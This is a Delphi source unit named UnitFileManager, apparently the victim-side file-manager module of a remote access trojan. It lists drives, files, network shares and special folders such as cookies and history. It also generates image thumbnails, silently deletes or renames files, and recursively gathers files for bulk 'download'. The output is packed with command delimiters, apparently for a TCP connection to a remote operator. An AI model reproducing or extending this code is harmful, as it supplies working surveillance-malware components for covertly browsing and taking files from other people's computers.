Unit UnitFileManager;

interface

function DriveList: WideString;
function ListarArquivos(Dir: WideString): WideString;
function CriarPasta(Pasta: WideString): boolean;
function DeleteAllFilesAndDir(FilesOrDir: WideString; EnviarLixeira: boolean): boolean;
function RenomearFileAndDir(DirFrom, DirTo: WideString): boolean;
function GetThumbs(Size, Quality: integer; FileList: WideString): WideString;
procedure FileSearch(const PathName, FileName : WideString; const InDir : boolean);
function GetSearchThumbs(Size, Quality: integer; FileList: WideString): WideString;
function ListSharedFolders: WideString;
function GetSpecialFolders: WideString;
function ListDirs(aPath: WideString; aRecursive: Boolean = True): WideString;
function GetSpecialFoldersFull: WideString;
function FileExistsOnComp(const PathName, FileName : WideString; const InDir : boolean): WideString;
procedure DownloadFolderSearch(const PathName, FileName : WideString; const InDir : boolean);
function DownloadAllFiles(const PathName, Filter : WideString; const InDir, InSearch: boolean): WideString;

type
  ThumbsInfo = class
    Size: integer;
    FileList: WideString;
    Quality: integer;
    Finalizar: boolean;
end;

implementation

uses
  Windows,
  Classes,
  UnitConstantes,
  IdTCPClient,
  UnitConfigs,
  untCapFuncs,
  UnitConexao,
  UnitFuncoesDiversas,
  ImageHlp,
  ShellApi,
  GlobalVars,
  StrUtils,
  SysUtils;

type
  TFileName = type widestring;

  TSearchRec = record
    Time: Integer;
    Size: Int64;
    Attr: Integer;
    Name: TFileName;
    ExcludeAttr: Integer;
    FindHandle: THandle  platform;
    FindData: TWin32FindDataW  platform;
  end;

function IntToStr(i: Int64): WideString;
begin
  Str(i, Result);
end;

function StrToInt(S: WideString): Int64;
var
  E: integer;
begin
  Val(S, Result, E);
end;

function FindMatchingFile(var F: TSearchRec): Integer;
var
  LocalFileTime: TFileTime;
begin
  with F do
  begin
    while FindData.dwFileAttributes and ExcludeAttr <> 0 do
      if not FindNextFileW(FindHandle, FindData) then
      begin
        Result := GetLastError;
        Exit;
      end;
    FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
    FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi,
      LongRec(Time).Lo);
    Size := FindData.nFileSizeLow;
    Attr := FindData.dwFileAttributes;
    Name := FindData.cFileName;
  end;
  Result := 0;
end;

procedure FindClose(var F: TSearchRec);
begin
  if F.FindHandle <> INVALID_HANDLE_VALUE then
  begin
    Windows.FindClose(F.FindHandle);
    F.FindHandle := INVALID_HANDLE_VALUE;
  end;
end;

function FindFirst(const Path: widestring; Attr: Integer;
  var  F: TSearchRec): Integer;
const
  faSpecial = faHidden or faSysFile or faVolumeID or faDirectory;
begin
  F.ExcludeAttr := not Attr and faSpecial;
  F.FindHandle := FindFirstFileW(PWideChar(Path), F.FindData);
  if F.FindHandle <> INVALID_HANDLE_VALUE then
  begin
    Result := FindMatchingFile(F);
    if Result <> 0 then FindClose(F);
  end else
    Result := GetLastError;
end;

function FindNext(var F: TSearchRec): Integer;
begin
  if FindNextFileW(F.FindHandle, F.FindData) then
    Result := FindMatchingFile(F) else
    Result := GetLastError;
end;

type
  PSHItemID = ^TSHItemID;
  {$EXTERNALSYM _SHITEMID}
  _SHITEMID = record
    cb: Word;                         { Size of the ID (including cb itself) }
    abID: array[0..0] of Byte;        { The item ID (variable length) }
  end;
  TSHItemID = _SHITEMID;
  {$EXTERNALSYM SHITEMID}
  SHITEMID = _SHITEMID;

  PItemIDList = ^TItemIDList;
  {$EXTERNALSYM _ITEMIDLIST}
  _ITEMIDLIST = record
     mkid: TSHItemID;
   end;
  TItemIDList = _ITEMIDLIST;
  {$EXTERNALSYM ITEMIDLIST}
  ITEMIDLIST = _ITEMIDLIST;

type
  IMalloc = interface(IUnknown)
    ['{00000002-0000-0000-C000-000000000046}']
    function Alloc(cb: Longint): Pointer; stdcall;
    function Realloc(pv: Pointer; cb: Longint): Pointer; stdcall;
    procedure Free(pv: Pointer); stdcall;
    function GetSize(pv: Pointer): Longint; stdcall;
    function DidAlloc(pv: Pointer): Integer; stdcall;
    procedure HeapMinimize; stdcall;
  end;

function Succeeded(Res: HResult): Boolean;
begin
  Result := Res and $80000000 = 0;
end;

function SHGetMalloc(out ppMalloc: IMalloc): HResult; stdcall; external 'shell32.dll' name 'SHGetMalloc'
function SHGetSpecialFolderLocation(hwndOwner: HWND; nFolder: Integer;
  var ppidl: PItemIDList): HResult; stdcall; external 'shell32.dll' name 'SHGetSpecialFolderLocation';
function SHGetPathFromIDList(pidl: PItemIDList; pszPath: PWideChar): BOOL; stdcall; external 'shell32.dll' name 'SHGetPathFromIDListW';

const
  CSIDL_FLAG_CREATE = $8000;
  CSIDL_ADMINTOOLS = $0030;
  CSIDL_ALTSTARTUP = $001D;
  CSIDL_APPDATA = $001A;
  CSIDL_BITBUCKET = $000A;
  CSIDL_CDBURN_AREA = $003B;
  CSIDL_COMMON_ADMINTOOLS = $002F;
  CSIDL_COMMON_ALTSTARTUP = $001E;
  CSIDL_COMMON_APPDATA = $0023;
  CSIDL_COMMON_DESKTOPDIRECTORY = $0019;
  CSIDL_COMMON_DOCUMENTS = $002E;
  CSIDL_COMMON_FAVORITES = $001F;
  CSIDL_COMMON_MUSIC = $0035;
  CSIDL_COMMON_PICTURES = $0036;
  CSIDL_COMMON_PROGRAMS = $0017;
  CSIDL_COMMON_STARTMENU = $0016;
  CSIDL_COMMON_STARTUP = $0018;
  CSIDL_COMMON_TEMPLATES = $002D;
  CSIDL_COMMON_VIDEO = $0037;
  CSIDL_CONTROLS = $0003;
  CSIDL_COOKIES = $0021;
  CSIDL_DESKTOP = $0000;
  CSIDL_DESKTOPDIRECTORY = $0010;
  CSIDL_DRIVES = $0011;
  CSIDL_FAVORITES = $0006;
  CSIDL_FONTS  = $0014;
  CSIDL_HISTORY = $0022;
  CSIDL_INTERNET = $0001;
  CSIDL_INTERNET_CACHE = $0020;
  CSIDL_LOCAL_APPDATA = $001C;
  CSIDL_MYDOCUMENTS = $000C;
  CSIDL_MYMUSIC = $000D;
  CSIDL_MYPICTURES = $0027;
  CSIDL_MYVIDEO = $000E;
  CSIDL_NETHOOD = $0013;
  CSIDL_NETWORK = $0012;
  CSIDL_PERSONAL = $0005;
  CSIDL_PRINTERS = $0004;
  CSIDL_PRINTHOOD = $001B;
  CSIDL_PROFILE = $0028;
  CSIDL_PROFILES = $003E;
  CSIDL_PROGRAM_FILES = $0026;
  CSIDL_PROGRAM_FILES_COMMON = $002B;
  CSIDL_PROGRAMS = $0002;
  CSIDL_RECENT = $0008;
  CSIDL_SENDTO = $0009;
  CSIDL_STARTMENU = $000B;
  CSIDL_STARTUP = $0007;
  CSIDL_SYSTEM = $0025;
  CSIDL_TEMPLATES = $0015;
  CSIDL_WINDOWS = $0024;

function GetShellFolder(CSIDL: integer): widestring;
var
  pidl                   : PItemIdList;
  FolderPath             : widestring;
  SystemFolder           : Integer;
  Malloc                 : IMalloc;
begin
  Malloc := nil;
  FolderPath := '';
  SHGetMalloc(Malloc);
  if Malloc = nil then
  begin
    Result := FolderPath;
    Exit;
  end;
  try
    SystemFolder := CSIDL;
    if SUCCEEDED(SHGetSpecialFolderLocation(0, SystemFolder, pidl)) then
    begin
      SetLength(FolderPath, max_path);
      if SHGetPathFromIDList(pidl, PWideChar(FolderPath)) then
      begin
        SetLength(FolderPath, length(PWideChar(FolderPath)));
      end else FolderPath := '';
    end;
    Result := FolderPath;
  finally
    Malloc.Free(pidl);
  end;
end;

function GetSpecialFolders: WideString;
begin
  result := '';
  result := result + 'DESKTOP' + '|' + GetShellFolder(CSIDL_DESKTOP) + delimitadorComandos;
  result := result + 'PERSONAL' + '|' + GetShellFolder(CSIDL_PERSONAL) + delimitadorComandos;
  result := result + 'FAVORITES' + '|' + GetShellFolder(CSIDL_FAVORITES) + delimitadorComandos;
  result := result + 'RECENT' + '|' + GetShellFolder(CSIDL_RECENT) + delimitadorComandos;
end;

function GetSpecialFoldersFull: WideString;
const
  RootSpecials: array [0..35] of Integer = (
    CSIDL_DESKTOP, CSIDL_INTERNET, CSIDL_PROGRAMS, CSIDL_CONTROLS, CSIDL_PRINTERS, CSIDL_PERSONAL,
    CSIDL_FAVORITES, CSIDL_STARTUP, CSIDL_RECENT, CSIDL_SENDTO, CSIDL_BITBUCKET, CSIDL_STARTMENU,
    CSIDL_MYMUSIC, CSIDL_MYVIDEO, CSIDL_DESKTOPDIRECTORY, CSIDL_NETHOOD, CSIDL_FONTS, CSIDL_COMMON_STARTMENU,
    CSIDL_COMMON_PROGRAMS, CSIDL_COMMON_STARTUP, CSIDL_COMMON_DESKTOPDIRECTORY, CSIDL_APPDATA, CSIDL_PRINTHOOD, CSIDL_LOCAL_APPDATA,
    CSIDL_COMMON_APPDATA, CSIDL_WINDOWS, CSIDL_SYSTEM, CSIDL_PROGRAM_FILES, CSIDL_COMMON_DOCUMENTS, CSIDL_COMMON_MUSIC,
    CSIDL_COMMON_PICTURES, CSIDL_COMMON_VIDEO, CSIDL_COMMON_FAVORITES, CSIDL_INTERNET_CACHE, CSIDL_COOKIES, CSIDL_HISTORY);
var
  TempStr: WideString;
  i: integer;
begin
  Result := '';

  for i := 0 to 35 do
  begin
    TempStr := GetShellFolder(RootSpecials[i]);
    if TempStr <> '' then
    begin
      Result := Result + IntToStr(i) + '|' + TempStr + DelimitadorComandos;
    end;
  end;
end;

function EnumFuncLAN(NetResource: PNetResource; ItemIndex: integer): WideString;
var
  Enum: THandle;
  Count, BufferSize: DWORD;
  Buffer: array[0..16384 div SizeOf(TNetResource)] of TNetResource;
  i: Integer;
begin
  result := '';

  if WNetOpenEnum(RESOURCE_GLOBALNET, RESOURCETYPE_ANY, 0, NetResource, Enum) = NO_ERROR then
  try
    Count := $FFFFFFFF;
    BufferSize := SizeOf(Buffer);
    while WNetEnumResource(Enum, Count, @Buffer, BufferSize) = NO_ERROR do
    for i := 0 to Count - 1 do
    begin
      case ItemIndex of
        0:
        begin {Network Machines}
          if Buffer[i].dwType = RESOURCETYPE_ANY then
          Result := Result + Buffer[i].lpRemoteName + '|' + '7' + '|' + delimitadorComandos;
        end;
        1:
        begin {Shared Drives}
          if Buffer[i].dwType = RESOURCETYPE_DISK then
          Result := Result + Buffer[i].lpRemoteName + '|' + '8' + '|' + delimitadorComandos;
        end;
        2:
        begin {Printers}
          if Buffer[i].dwType = RESOURCETYPE_PRINT then
          Result := Result + Buffer[i].lpRemoteName + '|' + '9' + '|' + delimitadorComandos;
        end;
      end;
      if (Buffer[i].dwUsage and RESOURCEUSAGE_CONTAINER) > 0 then
      Result := Result + EnumFuncLan(@Buffer[i], 1);
    end;
    finally
    WNetCloseEnum(Enum);
  end;
end;

function ListSharedFolders: WideString;
begin
  result := EnumFuncLAN(nil, 1);
end;

procedure FileSearch(const PathName, FileName : WideString; const InDir : boolean);
var
  Rec: TSearchRec;
  Find: TWin32FindDataW;
  Path: WideString;
  ResultStream: TMemoryStream;
  TempStr: WideString;
begin
  if SearchFileStop = true then exit;
  path := PathName;

  if path[length(path)] <> '\' then path := path + '\';

  TempStr := '';
  if FindFirst(Path + FileName, faAnyFile - faDirectory, Rec) = 0 then
  try
    repeat
      if SearchFileStop = true then break;
      Find := Rec.FindData;
      ResultStream := TMemoryStream.Create;
      ResultStream.Write(Find, sizeof(TWin32FindDataW));
      ResultStream.Position := 0;
      setlength(TempStr, ResultStream.Size);
      ResultStream.Read(TempStr[1], ResultStream.Size);
      ResultStream.Free;
      SearchFileResult := SearchFileResult + Path + delimitadorComandos + TempStr;
    until FindNext(Rec) <> 0;
    finally
    FindClose(Rec);
  end;

  If not InDir then Exit;

  if FindFirst(Path + '*.*', faDirectory, Rec) = 0 then
  try
    repeat
    if ((Rec.Attr and faDirectory) <> 0)  and (Rec.Name <> '.') and (Rec.Name <> '..') then
    FileSearch(Path + Rec.Name, FileName, True);
    until FindNext(Rec) <> 0;
    finally
    FindClose(Rec);
  end;
end;

procedure DownloadFolderSearch(const PathName, FileName : WideString; const InDir : boolean);
var
  Rec: TSearchRec;
  Find: TWin32FindDataW;
  Path: WideString;
  TempStr: WideString;
begin
  if SearchDownFolderStop = true then
  begin
    SearchDownFolderResult := '';
    exit;
  end;

  path := PathName;

  if path[length(path)] <> '\' then path := path + '\';

  TempStr := '';
  if FindFirst(Path + FileName, faAnyFile - faDirectory, Rec) = 0 then
  try
    repeat
      if SearchDownFolderStop = true then
      begin
        SearchDownFolderResult := '';
        Exit;
      end;
      Find := Rec.FindData;

      TempStr := Path + WideString(Find.cFileName);
      if PossoMexer(TempStr) = True then
        SearchDownFolderResult := SearchDownFolderResult + TempStr + DelimitadorComandos;
    until FindNext(Rec) <> 0;
    finally
    FindClose(Rec);
  end;

  If not InDir then Exit;

  if FindFirst(Path + '*.*', faDirectory, Rec) = 0 then
  try
    repeat
    if ((Rec.Attr and faDirectory) <> 0)  and (Rec.Name <> '.') and (Rec.Name <> '..') then
    DownloadFolderSearch(Path + WideString(Rec.Name), FileName, True);
    until FindNext(Rec) <> 0;
    finally
    FindClose(Rec);
  end;
end;

function GetSearchThumbs(Size, Quality: integer; FileList: WideString): WideString;
var
  TempStr: WideString;
  TempFile: WideString;
begin
  Result := '';
  while (FileList <> '') and (ThumbSearchStop = false) do
  begin
    TempFile := Copy(FileList, 1, posex(delimitadorComandos, FileList) - 1);
    delete(FileList, 1, posex(delimitadorComandos, FileList) - 1);
    delete(FileList, 1, length(delimitadorComandos));
    TempStr := GetAnyImageToString(TempFile, Quality, size, size);
    Result := Result + TempFile + delimitadorComandos + TempStr + delimitadorComandos;
    processmessages;
  end;
  if ThumbSearchStop = True then result := '';
end;

function GetThumbs(Size, Quality: integer; FileList: WideString): WideString;
var
  TempStr: WideString;
  TempFile: WideString;
begin
  Result := '';
  while (FileList <> '') and (ThumbStop = false) do
  begin
    TempFile := Copy(FileList, 1, posex(delimitadorComandos, FileList) - 1);
    delete(FileList, 1, posex(delimitadorComandos, FileList) - 1);
    delete(FileList, 1, length(delimitadorComandos));
    TempStr := GetAnyImageToString(TempFile, Quality, size, size);
    Result := Result + TempFile + delimitadorComandos + TempStr + delimitadorComandos;
    processmessages;
  end;
  if ThumbStop = true then Result := '';
end;

function GetVolumeInformationW(lpRootPathName: PWideChar;
  lpVolumeNameBuffer: PWideChar; nVolumeNameSize: DWORD; lpVolumeSerialNumber: PDWORD;
  var lpMaximumComponentLength, lpFileSystemFlags: DWORD;
  lpFileSystemNameBuffer: PWideChar; nFileSystemNameSize: DWORD): BOOL; stdcall; external 'kernel32.dll' name 'GetVolumeInformationW';

function DriveAttrib(Drive: widestring): widestring;
var
  FSSysFlags, maxCmpLen: DWord;
  pFSBuf: PWideChar;
begin
  GetMem(pFSBuf, MAX_PATH);
  ZeroMemory(pFSBuf, MAX_PATH);
  GetVolumeInformationW(pWidechar(Drive), nil, 0, nil, maxCmpLen, FSSysFlags, pFSBuf, MAX_PATH);
  result := (pFSBuf);
  FreeMem(pFSBuf, MAX_PATH);
end;

function DriveVolumeName(Drive: widestring): widestring;
var
  FSSysFlags,maxCmpLen: DWord;
  pFileSystem: PWideChar;
  pVolName: PWideChar;
begin
  GetMem(pVolName, MAX_PATH);
  ZeroMemory(pVolName, MAX_PATH);
  GetVolumeInformationW(PWideChar(Drive), pVolName, MAX_PATH, nil, maxCmpLen, FSSysFlags, nil, 0);
  result := (pVolName);
  FreeMem(pVolName, MAX_PATH);
end;

function GetLogicalDriveStrings(nBufferLength: DWORD;
  lpBuffer: PWideChar): DWORD; stdcall; external 'kernel32.dll' name 'GetLogicalDriveStringsW';
function GetDriveType(lpRootPathName: PWideChar): UINT; stdcall; external 'kernel32.dll' name 'GetDriveTypeW';

function GetDiskFreeSpaceEx(Directory: PWideChar; var FreeAvailable,
    TotalSpace: TLargeInteger; TotalFree: PLargeInteger): Bool; stdcall;
var
  SectorsPerCluster, BytesPerSector, FreeClusters, TotalClusters: LongWord;
  Temp: Int64;
  Dir: PWideChar;
begin
  if Directory <> nil then Dir := Directory else Dir := nil;
  Result := GetDiskFreeSpaceW(Dir, SectorsPerCluster, BytesPerSector,
    FreeClusters, TotalClusters);
  Temp := SectorsPerCluster * BytesPerSector;
  FreeAvailable := Temp * FreeClusters;
  TotalSpace := Temp * TotalClusters;
end;

function DriveList: Widestring;
var
  BufferSize, ReturnSize: dword;
  PBuffer: PWideChar;
  Buffer: PWideChar;
  DriveType: integer;
  mysize, freesize, totalsize: int64;
  DriveSize, UsedSize: Widestring;
begin
  Result := '';
  BufferSize := 10000;
  GetMem(Buffer, BufferSize);
  GetLogicalDriveStrings(BufferSize, Buffer);
  PBuffer := Buffer;
  while PBuffer^ <> #0 do
  begin
    DriveType := GetDriveType(PBuffer);

    MySize := 0;
    Totalsize := 0;
    Freesize := 0;
    GetDiskFreeSpaceEx(PBuffer, MySize, Totalsize, @Freesize);

    DriveSize := Inttostr(TotalSize);
    UsedSize := Inttostr(MySize);

    Result := Result + PBuffer + delimitadorComandos;
    Result := Result +  DriveSize + delimitadorComandos;
    Result := Result +  UsedSize + delimitadorComandos;
    Result := Result +  DriveAttrib(PBuffer) + delimitadorComandos;
    Result := Result +  inttostr(DriveType) + delimitadorComandos;
    Result := Result +  DriveVolumeName(PBuffer) + delimitadorComandos + #13#10;

    Inc(PBuffer,4);
  end;
end;

function StreamToStr(S: TStream): WideString;
var
  SizeStr: integer;
begin
  S.Position := 0;
  SizeStr := S.Size;
  SetLength(Result, SizeStr div 2);
  S.Read(pointer(Result)^, SizeStr);
end;

procedure StrToStream(S: TStream; const SS: WideString);
var
  SizeStr: integer;
begin
  S.Position := 0;
  SizeStr := Length(SS);
  S.Write(pointer(SS)^, SizeStr * 2);
end;

function ListarArquivos(Dir: WideString): WideString;
var
  ToSend, TempStrDir, TempStrFiles: WideString;
  H: THandle;
  Find: TWin32FindDataW;
  ResultStreamDir: TMemoryStream;
  ResultStreamFiles: TMemoryStream;
  TempStr: WideString;
begin
  result := '';
  if dir = '' then exit;
  if dir[length(dir)] <> '\' then Dir := Dir + '\';
  try
  ResultStreamDir := TMemoryStream.Create;
  ResultStreamFiles := TMemoryStream.Create;

  TempStr := Dir + '*.*';
  H := FindFirstFileW(pwidechar(TempStr), Find);
  if H = INVALID_HANDLE_VALUE then exit;

  ResultStreamDir.Write(Find, sizeof(Find));

  while FindNextFileW(H, Find) do
  if not (Find.dwFileAttributes and $00000010 <> 0) then // não é diretório
  ResultStreamFiles.Write(Find, sizeof(Find)) else
  ResultStreamDir.Write(Find, sizeof(Find));

  Windows.FindClose(H);

  TempStrDir := StreamToStr(ResultStreamDir);
  TempStrFiles := StreamToStr(ResultStreamFiles);
   finally
  ResultStreamDir.Free;
  ResultStreamFiles.Free;
  end;


  result := TempStrDir + delimitadorComandos + TempStrFiles;
end;

function CriarPasta(Pasta: WideString): boolean;
begin
  result := UnitFuncoesDiversas.ForceDirectories(pWideChar(Pasta));
end;

function RenomearFileAndDir(DirFrom, DirTo: WideString): boolean;
begin
  if DirFrom = DirTo then //Duh!
    Result := False
  else
    Result := movefileW(pwidechar(DirFrom), pwideChar(DirTo));
end;

function DeleteAllFilesAndDir(FilesOrDir: WideString; EnviarLixeira: boolean): boolean;
var
  F: TSHFileOpStructW;
  From: WideString;
  Resultval: integer;
begin
  FillChar(F, SizeOf(F), #0);
  From := FilesOrDir + #0;
  try
    F.wnd := 0;
    F.wFunc := FO_DELETE;
    F.pFrom := pwideChar(From);
    F.pTo := nil;

    if EnviarLixeira = true then F.fFlags := FOF_ALLOWUNDO;
    F.fFlags := F.fFlags or
                FOF_NOCONFIRMATION or
                FOF_SIMPLEPROGRESS or
                FOF_FILESONLY or
                FOF_NOERRORUI;

    F.fAnyOperationsAborted := False;
    F.hNameMappings := nil;
    Resultval := ShFileOperationW(F);
    Result := (ResultVal = 0);
    finally
  end;
end;

function ListDirs(aPath: WideString; aRecursive: Boolean = True): WideString;
var
  SearchRec: TSearchRec;
  s: WideString;
begin
  s := #13#10;
  if aPath[Length(aPath)] <> '\' Then aPath := aPath + '\';
  if FindFirst(aPath + '*.*', faDirectory, SearchRec) = 0 Then
  begin
    Repeat
      If (SearchRec.Attr and faDirectory = faDirectory) and (SearchRec.Name[1] <> '.') then
      begin
        Result := Result + aPath + SearchRec.Name + s;
      end;
      if (aRecursive) and (SearchRec.Name[1] <> '.') then
      begin
        Result := Result + ListDirs(aPath + SearchRec.Name, False);
      end;
    until FindNext(SearchRec) <> 0;
  end;
  FindClose(SearchRec);
end;

function FileExistsOnComp(const PathName, FileName : WideString; const InDir : boolean): WideString;
var
  Rec: TSearchRec;
  Find: TWin32FindDataW;
  Path: WideString;
begin
  sleep(5);
  ProcessMessages;
  Result := '';
  if StopFileExistsComputer = true then exit;
  path := PathName;

  if path[length(path)] <> '\' then path := path + '\';

  if FindFirst(Path + FileName, faAnyFile - faDirectory, Rec) = 0 then
  try
    repeat
      if StopFileExistsComputer = true then break;
      Find := Rec.FindData;
      Result := Path + Find.cFileName;
      if Result <> '' then
      begin
        StopFileExistsComputer := True;
        break;
      end;
    until FindNext(Rec) <> 0;
    finally
    FindClose(Rec);
  end;

  If not InDir then Exit;
  if Result <> '' then exit;

  if FindFirst(Path + '*.*', faDirectory, Rec) = 0 then
  try
    repeat
      if ((Rec.Attr and faDirectory) <> 0)  and (Rec.Name <> '.') and (Rec.Name <> '..') then
      Result := FileExistsOnComp(Path + Rec.Name, FileName, True);
      if Result <> '' then
      begin
        StopFileExistsComputer := True;
        break;
      end;
    until FindNext(Rec) <> 0;
    finally
    FindClose(Rec);
  end;
end;

function DownloadAllFiles(const PathName, Filter : WideString; const InDir, InSearch: boolean): WideString;
var
  Rec: TSearchRec;
  Find: TWin32FindDataW;
  Path, TempStr: WideString;
  ResultStream: TMemoryStream;
  Procura: integer;
begin
  sleep(5);
  ProcessMessages;
  Result := '';
  if StopDownloadAll = True then Exit;
  path := PathName;

  if path[length(path)] <> '\' then path := path + '\';

  procura := FindFirst(Path + '*.*', faAnyFile - faDirectory, Rec);

  if Procura = 0 then
  try
    repeat
      Find := Rec.FindData;
      if ExtractFileExt(AnsiString(Find.cFileName)) = '' then continue;

      if InSearch = False then if posex('*' + LowerString(ExtractFileExt(AnsiString(Find.cFileName))), Filter) > 0 then
      begin
        if StopDownloadAll = True then Break;
        Continue;
      end;

      if InSearch = True then if posex('*' + LowerString(ExtractFileExt(AnsiString(Find.cFileName))), Filter) <= 0 then
      begin
        if StopDownloadAll = True then Break;
        Continue;
      end;
       try
      ResultStream := TMemoryStream.Create;
      ResultStream.Write(Find, sizeof(TWin32FindDataW));
      ResultStream.Position := 0;
      setlength(TempStr, ResultStream.Size);
      ResultStream.Read(TempStr[1], ResultStream.Size);
       finally
       ResultStream.Free;
       end;

      Result := Result + Path + delimitadorComandos + TempStr;

      if StopDownloadAll = True then Break;
    until FindNext(Rec) <> 0;
    finally
    FindClose(Rec);
  end;

  if StopDownloadAll = True then result := '';
  If not InDir then Exit;
  if StopDownloadAll = True then Exit;

  if FindFirst(Path + '*.*', faDirectory, Rec) = 0 then
  try
    repeat
      if ((Rec.Attr and faDirectory) <> 0)  and (Rec.Name <> '.') and (Rec.Name <> '..') then
      Result := Result + DownloadAllFiles(Path + Rec.Name, Filter, True, InSearch);
    until FindNext(Rec) <> 0;
    finally
    FindClose(Rec);
  end;

  if StopDownloadAll = True then result := '';
end;

end.
